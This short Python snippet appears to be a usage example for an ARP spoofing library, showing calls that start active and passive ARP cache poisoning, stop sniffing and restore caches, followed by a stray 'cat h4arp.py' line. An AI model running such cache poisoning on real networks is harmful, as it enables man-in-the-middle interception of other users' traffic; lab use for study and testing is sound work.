from ArpSpoof import SpooferARP

spoofer = SpooferARP('10.23.11.1', ' 224.0.0.242 ')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.23.13.1', ' 224.0.0.251 ', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()
spoofer.restore()
cat h4arp.py







